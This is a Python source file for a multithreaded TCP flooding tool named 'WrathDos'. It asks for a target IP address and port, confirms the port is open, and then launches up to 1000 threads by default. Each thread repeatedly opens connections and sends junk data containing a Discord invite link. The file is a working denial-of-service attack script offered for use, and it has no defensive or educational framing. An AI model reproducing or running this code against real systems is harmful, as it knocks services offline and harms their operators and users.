import socket

from threading import Thread

from pystyle import Colorate, Center, Write, Anime, Colors, System, Col








class WrathDos:
    def check_port(ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)

            addr = (ip, port)
            check = sock.connect_ex(addr)
            sock.close()

            return not check
        except:
            return False

    def dos(ip: str, port: int, th: int):
        global n
        n = 1
        for i in range(th):
            Thread(target=WrathDos._dos, args=[ip, port]).start()
            print(Colorate.Horizontal(Colors.red_to_green, f"Creating thread number {i + 1}..."))


    def _dos(ip: str, port: int):
        global n
        
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                addr = (ip, port)
                sock.connect_ex(addr)
                print(Colorate.Horizontal(Colors.red_to_green, f"Initializing connection number {n}..."))
                n += 1
                sock.send(b'discord.gg/techbeams'*1024)
                print(Colorate.Horizontal(Colors.red_to_green, f"Sending 1024 bytes to {ip}:{port}..."))
            except:
                print(Colorate.Horizontal(Colors.red_to_blue, "Error! Connection refused."))
                
        





def main():
    

    ip = Write.Input("Enter the IP address -> ", Colors.red_to_green, interval=0.)

    port = Write.Input("Enter the port -> ", Colors.red_to_green, interval=0)

    print()

    try:
        port = int(port)
    except ValueError:
        Colorate.Error("Please enter a valid port!", wait=True)

    th = Write.Input("Enter threads (press enter for 1000) -> ", Colors.red_to_green, interval=0.000)
    if not th: th = '1000'

    try:
        th = int(th)
    except ValueError:
        Colorate.Error("\nPlease enter a valid threads number!", wait=True)


    print('\n')

    if WrathDos.check_port(ip, port):
        input(Colorate.Horizontal(Colors.red_to_green, f"{ip}:{port} is open! Press enter to start the attack..."))
    else:
        input(f"" + Col.red + f"{ip}:{port} is closed or doesn't respond. Cannot start the attack.")
        exit()
    
    

    WrathDos.dos(ip=ip, port=port, th=th)



